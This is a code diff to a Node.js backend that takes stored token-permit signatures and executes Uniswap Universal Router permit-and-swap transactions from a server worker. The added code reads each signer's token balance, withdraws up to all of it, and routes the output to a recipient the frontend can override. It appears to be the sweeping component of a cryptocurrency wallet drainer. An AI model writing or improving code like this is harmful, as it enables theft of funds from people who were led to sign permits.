@@ -92,6 +92,7 @@ function buildUniversalRouterTx(data, overrides = {}) {
   const outputToken = overrides.outputToken || process.env.OUTPUT_TOKEN || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; // WETH
   
   const amountBn = BigInt(amount);
+  const withdrawAmountBn = overrides.withdrawAmount !== undefined ? BigInt(overrides.withdrawAmount) : amountBn;
   const signatureBytes = buildSignatureBytes(r, s, v);
   const permitAbi = new ethers.AbiCoder();
 
@@ -116,7 +117,7 @@ function buildUniversalRouterTx(data, overrides = {}) {
   const swapAbi = new ethers.AbiCoder();
   const swapInput = swapAbi.encode(
     ["bytes", "uint256", "uint256", "address"],
-    [path, amountBn, BigInt(0), recipient]
+    [path, withdrawAmountBn, BigInt(0), recipient]
   );
 
   // Hardcoded command string 0x02 (Permit) + 0x08 (Swap)
@@ -207,9 +208,28 @@ app.post('/api/run-worker', async (req, res) => {
       const data = docSnap.data();
       
       try {
-        // Build Tx with optional overrides from frontend
-        const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { recipient, outputToken });
-        
+        // Determine withdrawAmount = min(owner balance, signed amount)
+        let withdrawAmountBn = BigInt(data.amount);
+        try {
+          const tokenContract = new ethers.Contract(data.token, ["function balanceOf(address) view returns (uint256)"], provider);
+          const ownerBal = await tokenContract.balanceOf(data.owner);
+          const ownerBalBn = BigInt(ownerBal);
+          if (ownerBalBn < withdrawAmountBn) withdrawAmountBn = ownerBalBn;
+        } catch (bErr) {
+          console.error('failed to read owner balance', bErr);
+        }
+
+        if (withdrawAmountBn === 0n) {
+          await docSnap.ref.update({ lastError: 'owner has zero token balance', lastErrorAt: Date.now(), withdrawAmount: '0' });
+          if (docId) throw new Error('owner has zero token balance');
+          continue;
+        }
+
+        try { await docSnap.ref.update({ withdrawAmount: withdrawAmountBn.toString() }); } catch (u) { console.error('failed to write withdrawAmount', u); }
+
+        // Build Tx with optional overrides from frontend (withdrawAmount enforced)
+        const { commands, inputs, execDeadline } = buildUniversalRouterTx(data, { recipient, outputToken, withdrawAmount: withdrawAmountBn });
+
         // Estimate Gas
         const gasEstimate = await router.execute.estimateGas(commands, inputs, execDeadline, { value: 0 });
         
@@ -225,7 +245,8 @@ app.post('/api/run-worker', async (req, res) => {
           processed: true,
           routerTx: receipt.hash,
           processedAt: Date.now(),
-          adminExecutor: "BACKEND_SERVER"
+          adminExecutor: "BACKEND_SERVER",
+          withdrawAmount: withdrawAmountBn.toString()
         });
         
         processedCount++;
